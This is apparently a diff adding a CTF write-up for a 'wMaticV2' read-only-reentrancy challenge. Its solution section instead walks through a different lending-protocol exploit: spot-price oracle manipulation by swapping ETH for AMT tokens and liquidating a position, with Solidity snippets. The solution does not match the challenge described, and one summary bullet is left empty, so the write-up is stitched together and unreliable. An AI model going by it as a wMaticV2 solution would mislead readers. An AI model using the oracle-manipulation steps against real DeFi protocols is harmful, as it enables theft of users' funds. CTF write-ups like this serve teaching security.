@@ -1,0 +1,107 @@
+# wMaticV2 Challenge
+| Verilog Solutions CTF 2022 Challenge - read-only reentrancy hacks
+
+## Description & Setup
+This challenge does not need any setup, it contains:
+- `WMATICV2.sol` Contract: a newly implemented smart contract for the newest version of wMatic
+- `Bounty.sol` Contract: a simple insurance smart contract designed for checking the security of the wMatic V2
+
+| ITEM                                | Description                                    |
+|-------------------------------------|------------------------------------------------|
+| wMatic Contract                     | 0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270     |
+| wMatic V2 Contract                  | 0x5D6C48F05ad0fde3f64baB50628637d73B1eB0BB     |
+| Bounty Contract	                    | 0xBcF6e9d27bf95F3F5eDDB93C38656D684317D5b4     |
+
+
+You can also check here for the smart contract code:
+[Verilog CTF 2022 Challenge #2](https://github.com/Verilog-Solutions/CTF-2022-wMaticV2)
+
+To get the bounty, you need to pay attention to the `getBounty()` function inside the Bounty contract:
+```solidity
+  // from Bounty.sol 
+  function getBounty() public returns (bool) {
+      uint256 delta = WMATICV2.totalSupply() >= WMATICV2.balance()
+          ? WMATICV2.totalSupply() - WMATICV2.balance()
+          : WMATICV2.balance() - WMATICV2.totalSupply();
+      uint256 tolerance = WMATICV2.balance() / 10;
+      if (delta > tolerance) {
+          // reward the first finder
+          isHacked = true;
+          IERC20(WMATIC).transfer(msg.sender, IERC20(WMATIC).balanceOf(address((this))));
+          winner = address(msg.sender);
+      }
+      return isHacked;
+  }
+```
+
+To summarize the above information:
+- 
+
+
+## Solution
+
+The way to attack this lending protocol is relatively easy to figure out.
+The key of the manipulation is within these lines of the code:
+```solidity
+    function rate() public view returns (uint256) {
+        (uint112 _reserve0, uint112 _reserve1,) = pair.getReserves();
+        uint256 _rate = uint256(_reserve0 / _reserve1);
+        return _rate;
+    }
+```
+The oracle implementation is without the TWAP just brutally using the spot price. 
+Thus, we can use flashloan to manipulate the spot price and perform the attack, or just simply use the amount of tokens we had to perform the attack.
+In the liquidate function:
+```solidity
+  // safeDebt calculation
+    function safeDebt(address user) public view returns (uint256) {
+          return deposited[user] * rate() * 2 / 3;
+    }
+
+ // repay a user's loan and get back their collateral. no discounts.
+    function liquidate(address user, uint256 amount) public returns (uint256) {
+        require(safeDebt(user) <= debt[user], "err: overcollateralized");
+        debt[user] -= amount;
+        token.transferFrom(msg.sender, address(this), amount);
+        uint256 collateralValueRepaid = amount / rate();
+        weth.transfer(msg.sender, collateralValueRepaid);
+        return collateralValueRepaid;
+    }
+```
+If user's debt is bigger than their safeDebt which means user borrowed AMT token price goes rocket.
+Anyone can call liquidation method to liquidate user's fund.
+
+Implementation:
+Step 1: Trade 13 ETH for AMT token -> make the token price go roket
+```solidity
+ // trade 13 eth for some tokens
+    address[] memory path = new address[](2);
+    path[0] = address(weth);
+    path[1] = address(token);
+    uint256[] memory tokensReceived = router.swapExactTokensForTokens(
+        ethToSend,
+        1,
+        path,
+        address(this),
+        type(uint256).max
+    );
+```
+
+Step 2: we can liquidate the guy with the tokens received
+```solidity
+    uint256 receivedCollateral = broker.liquidate(address(setup), tokenReceived);
+    require(weth.balanceOf(address(this)) > balanceBefore);
+```
+Although the given solution manipulation is not profitable, but we can for sure manipulate the oracle.
+I found another method online, which has similar idea:
+
+Step 1: skew the uniswap ratio by buying lots of tokens
+```solidity
+    weth.transfer(address(pair), weth.balanceOf(address(this)));
+```
+Step 2: since win condition is when there are less than 5 eth in the pool, thus we only need to liquidate 21 eth.
+```solidity
+    uint256 liqAmount = 21 ether * rate;
+    broker.liquidate(address(setup), liqAmount);
+```
+
